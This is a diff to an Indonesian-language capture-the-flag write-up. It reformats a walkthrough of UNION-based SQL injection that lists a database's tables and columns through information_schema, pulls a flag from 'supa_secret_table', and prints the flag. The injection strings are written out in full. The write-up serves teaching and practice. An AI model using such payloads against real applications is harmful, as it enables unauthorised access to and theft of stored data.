@@ -33,12 +33,17 @@ Secara khusus, ```tabel information_schema.tables``` berisi informasi tentang se
 ```SQL
 Leonard "UNION (SELECT TABLE_NAME, 2,3 FROM INFORMATION_SCHEMA.TABLES); -
 ```
-Dan aplikasi akan mengembalikan semua nama tabel yang disimpan dalam database. Jika kita menggulir ke bawah dapat melihat dua tabel: anggota yaitu tabel yang berisi semua informasi anggota dan tabel lain bernama ```supa_secret_table```
+Dan aplikasi akan mengembalikan semua nama tabel yang disimpan dalam database. Jika kita menggulir ke bawah dapat melihat dua tabel: anggota yaitu tabel yang berisi semua informasi anggota dan tabel lain bernama ```supa_secret_table```.
 Tabel bernama ```information_schema.columns``` berisi semua informasi tentang kolom dari semua tabel yang disimpan. Jadi kita bisa mendapatkan nama field ```supa_secret_table``` dengan memasukkan kode:
+
 ```Leonard" UNION (SELECT COLUMN_NAME,2,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='supa_secret_table'); --```
-aplikasi akan mengembalikan dua record dengan nama field: id dan flag.
+
+Aplikasi akan mengembalikan dua record dengan nama field: id dan flag.
+
 ```Leonard" UNION (SELECT flag,2,3 FROM supa_secret_table); --```
+
 dan kemudian aplikasi akan mencetak flag nya.
+
 **Flag: dvCTF{1_h0p3_u_d1dnt_us3_sqlm4p}**
 
 ## Forensics
